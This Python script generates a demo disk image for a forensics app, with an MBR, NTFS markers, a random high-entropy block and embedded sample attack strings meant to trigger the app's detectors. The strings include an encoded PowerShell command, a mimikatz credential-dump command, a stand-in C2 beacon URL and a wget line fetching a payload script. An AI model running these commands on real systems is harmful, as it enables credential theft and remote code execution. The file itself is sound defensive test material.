"""make_demo_image.py — build a small .dd image that triggers the app's findings.

Generates an 8 MB raw disk image containing:
  * A valid MBR (boot signature 0x55AA, disk signature, one bootable NTFS partition)
  * An NTFS OEM-ID at offset 3 so the in-browser FS detector reports NTFS
  * A 2 MB high-entropy region (pseudo-random bytes) to trigger the adaptive
    entropy 3σ anomaly + the Isolation Forest multivariate anomaly
  * Malware/post-exploitation keyword strings (mimikatz, powershell -enc, …)
  * Indicators of Compromise (public IPv4, URL, registry key, Windows path, UNC, Linux path)

Run:    python make_demo_image.py
Output: sample_evidence.dd   (drag-and-drop into the app)
"""

import os
import struct

OUT = "sample_evidence.dd"
SIZE = 8 * 1024 * 1024  # 8 MB

img = bytearray(SIZE)

# --- MBR ---------------------------------------------------------------------
# NTFS OEM-ID at offset 3 (the app's parseMBR checks this exact location)
img[3:11] = b"NTFS    "

# Disk signature at offsets 440-443
img[440:444] = b"\xDE\xAD\xBE\xEF"

# One primary partition entry at offset 446: bootable (0x80), type 0x07 (NTFS),
# starts at LBA 2048, fills the rest of the image.
part = bytearray(16)
part[0] = 0x80                                          # active / bootable
part[4] = 0x07                                          # NTFS / exFAT
struct.pack_into("<I", part, 8,  2048)                  # start LBA
struct.pack_into("<I", part, 12, (SIZE // 512) - 2048)  # size in sectors
img[446:462] = part

# Boot signature
img[510] = 0x55
img[511] = 0xAA

# --- Plaintext region with malware keywords + IOCs ---------------------------
# Lives inside the first 10 MB so the app's string-extraction pass picks it up.
text = (
    "User logged in. Routine activity.\n"
    "C:\\Users\\suspect\\Downloads\\invoice.pdf opened\n"
    "powershell -enc SQBFAFgAKAAuLi4p   # encoded command\n"
    "mimikatz # sekurlsa::logonpasswords\n"
    "Beacon to http://malicious-c2.example.com/gate.php\n"
    "Callback IP 203.0.113.66 over 443\n"
    "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run added\n"
    "cmd.exe /c whoami & net user\n"
    "lateral move via \\\\FILESRV01\\IPC$ share\n"
    "stage data in /var/tmp/.cache/exfil.bin\n"
    "wget http://198.51.100.23/payload.sh; chmod +x payload.sh\n"
) * 50
encoded = text.encode()
img[600 : 600 + len(encoded)] = encoded

# --- High-entropy "encrypted" region -----------------------------------------
# 2 MB of /dev/urandom-style bytes => sectors here saturate near 8.0 bits/byte
# and are statistical outliers vs. the rest of the (mostly-zero) disk.
enc_start = 3 * 1024 * 1024
enc = os.urandom(2 * 1024 * 1024)
img[enc_start : enc_start + len(enc)] = enc

with open(OUT, "wb") as f:
    f.write(img)

print(
    f"Wrote {OUT} ({SIZE // 1024 // 1024} MB): valid MBR, NTFS, 1 partition, "
    f"2 MB high-entropy region, malware keywords + IOCs."
)
